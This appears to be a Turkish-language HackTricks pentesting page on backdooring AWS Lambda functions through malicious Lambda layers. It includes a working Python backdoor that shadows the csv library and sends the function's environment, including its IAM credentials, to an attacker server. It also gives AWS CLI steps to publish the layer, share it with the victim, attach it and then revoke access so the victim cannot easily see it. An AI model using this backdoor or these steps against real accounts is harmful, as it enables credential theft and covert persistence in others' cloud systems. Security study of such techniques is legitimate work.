# AWS - Lambda Katmanları Sürekliliği

{{#include ../../../../banners/hacktricks-training.md}}

## Lambda Katmanları

Bir Lambda katmanı, **ekstra kod** veya diğer içerikleri **içerebilen** bir .zip dosyası arşividir. Bir katman, kütüphaneler, bir [özel çalışma zamanı](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), veri veya yapılandırma dosyaları içerebilir.

Her fonksiyon için **beş katmana kadar** dahil etmek mümkündür. Bir katmanı bir fonksiyona dahil ettiğinizde, **içerikler yürütme ortamındaki `/opt`** dizinine çıkarılır.

**Varsayılan olarak**, oluşturduğunuz **katmanlar** AWS hesabınıza **özel**dir. Bir katmanı diğer hesaplarla **paylaşmayı** veya katmanı **genel** hale getirmeyi seçebilirsiniz. Fonksiyonlarınız, farklı bir hesap tarafından yayımlanan bir katmanı tüketiyorsa, fonksiyonlarınız **katman silindikten sonra veya katmana erişim izniniz geri alındıktan sonra katman sürümünü kullanmaya devam edebilir**. Ancak, silinmiş bir katman sürümünü kullanarak yeni bir fonksiyon oluşturamaz veya fonksiyonları güncelleyemezsiniz.

Bir konteyner görüntüsü olarak dağıtılan fonksiyonlar katmanları kullanmaz. Bunun yerine, görüntüyü oluşturduğunuzda tercih ettiğiniz çalışma zamanı, kütüphaneler ve diğer bağımlılıkları konteyner görüntüsüne paketlersiniz.

### Python yükleme yolu

Python'un lambda'da kullanacağı yükleme yolu şudur:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
Check how the **second** and third **positions** are occupy by directories where **lambda layers** uncompress their files: **`/opt/python/lib/python3.9/site-packages`** and **`/opt/python`**

> [!CAUTION]
> Eğer bir saldırgan kullanılan bir lambda **layer**'ına **arka kapı** eklemeyi veya **bir tane eklemeyi** başarırsa ve bu, **yaygın bir kütüphane yüklendiğinde rastgele kod çalıştırıyorsa**, her lambda çağrısında kötü niyetli kod çalıştırabilir.

Bu nedenle, gereksinimler şunlardır:

- **Kurbanların kodu tarafından yüklenen kütüphaneleri kontrol et**
- **Özel kod çalıştıracak ve orijinal** kütüphaneyi **yükleyecek bir proxy kütüphanesi oluştur.**

### Önceden yüklenmiş kütüphaneler

> [!WARNING]
> Bu tekniği kötüye kullanırken bir zorlukla karşılaştım: Bazı kütüphaneler, kodunuz çalıştırıldığında python çalışma zamanında **zaten yüklenmiş** durumda. `os` veya `sys` gibi şeyler bulmayı bekliyordum, ama **hatta `json` kütüphanesi bile yüklüydü**.\
> Bu kalıcılık tekniğini kötüye kullanmak için, kod çalıştırıldığında **yüklenmemiş yeni bir kütüphaneyi yüklemesi** gerekiyor.

Bu python kodu ile lambda'da python çalışma zamanında **önceden yüklenmiş kütüphanelerin listesini** elde etmek mümkündür:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
Ve bu **liste** (kütüphanelerin `os` veya `json` gibi zaten orada olduğundan emin olun)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
Ve bu, **lambda'nın varsayılan olarak yüklediği kütüphaneler** listesidir: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### Lambda Katmanı Arka Kapı

Bu örnekte, hedef kodun **`csv`**'yi içe aktardığını varsayalım. **`csv` kütüphanesinin içe aktarımına arka kapı koyacağız**.

Bunu yapmak için, **`/opt/python/lib/python3.9/site-packages`** yolunda **csv** adlı dizini ve içinde **`__init__.py`** dosyasını oluşturacağız.\
Sonra, lambda çalıştırıldığında ve **csv**'yi yüklemeye çalıştığında, **`__init__.py` dosyamız yüklenecek ve çalıştırılacaktır**.\
Bu dosya şunları yapmalıdır:

- Payload'ımızı çalıştırmak
- Orijinal csv kütüphanesini yüklemek

Her ikisini de şu şekilde yapabiliriz:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
Sonra, bu kodu **`python/lib/python3.9/site-packages/__init__.py`** yolunda bir zip dosyası oluşturun ve bunu bir lambda katmanı olarak ekleyin.

Bu kodu [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor) adresinde bulabilirsiniz.

Entegre yük, **ilk kez çağrıldığında veya lambda konteynerinin sıfırlanmasından sonra IAM kimlik bilgilerini bir sunucuya gönderecektir** (kod değişikliği veya soğuk lambda), ancak **aşağıdaki gibi diğer teknikler** de entegre edilebilir:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

### Harici Katmanlar

**Harici hesaplardan lambda katmanları** kullanmanın mümkün olduğunu unutmayın. Ayrıca, bir lambda, izinleri olmasa bile harici bir hesaptan bir katmanı kullanabilir.\
Ayrıca, bir lambda'nın sahip olabileceği **maksimum katman sayısının 5 olduğunu** unutmayın.

Bu nedenle, bu tekniğin çok yönlülüğünü artırmak için bir saldırgan şunları yapabilir:

- Kullanıcının mevcut bir katmanını arka kapı ile değiştirmek (hiçbir şey harici değil)
- **Kendi hesabında** bir **katman oluşturmak**, **kurban hesabına katmanı kullanma erişimi vermek**, **katmanı** kurbanın Lambda'sında **yapılandırmak** ve **izinleri kaldırmak**.
- **Lambda**, **katmanı kullanmaya** devam edebilecek ve **kurban**, **katman kodunu indirmek için** kolay bir yol bulamayacaktır (lambda içinde bir rev shell almanın dışında).
- Kurban, **`aws lambda list-layers`** ile kullanılan harici katmanları **görmeyecek**.
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{{#include ../../../../banners/hacktricks-training.md}}
